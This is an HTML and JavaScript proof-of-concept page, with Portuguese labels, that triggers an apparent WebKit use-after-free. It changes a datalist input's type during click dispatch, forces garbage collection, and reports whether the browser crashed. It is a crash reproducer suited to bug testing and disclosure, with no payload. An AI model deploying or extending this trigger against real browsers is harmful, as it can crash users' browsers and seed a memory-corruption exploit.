<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebKit DataListButton UAF PoC</title>
    <style>
        #input {
            width: 300px;
            height: 60px;
            font-size: 24px;
        }
        #btn-trigger {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <h3>Clique diretamente na seta do dropdown ou use o botão de trigger automático:</h3>
    
    <input id="input" type="text" list="list">
    <datalist id="list">
        <option value="Opcao A">
        <option value="Opcao B">
    </datalist>

    <br>
    <button id="btn-trigger">Disparar Teste Automático</button>
    <div id="status" style="margin-top: 15px; font-family: monospace;">Aguardando ação...</div>

    <script>
    const input = document.getElementById('input');
    const status = document.getElementById('status');

    // 1. O manipulador escuta o clique no input
    input.addEventListener('click', (e) => {
        status.innerText = 'Evento click recebido. Alterando input.type...';
        
        // Destrói a instância de TextFieldInputType enquanto o evento ainda está no meio do despacho
        input.type = 'button';

        // Tenta forçar a coleta de lixo/reuso de memória caso gc() esteja exposto
        if (typeof gc === 'function') {
            gc();
        } else if (window.GCController) {
            window.GCController.collect();
        }
    }, { once: true });

    // 2. Disparo automatizado simulando clique na extremidade direita (onde fica o list-button)
    document.getElementById('btn-trigger').onclick = () => {
        const rect = input.getBoundingClientRect();
        
        // Coordenadas próximas à borda direita para acertar o pseudo-elemento do dropdown
        const clickX = rect.left + rect.width - 15;
        const clickY = rect.top + (rect.height / 2);

        const evt = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            view: window,
            clientX: clickX,
            clientY: clickY
        });

        input.dispatchEvent(evt);

        setTimeout(() => {
            status.innerText = 'Teste finalizado: Sobreviveu (sem crash).';
        }, 100);
    };
    </script>
</body>
</html>
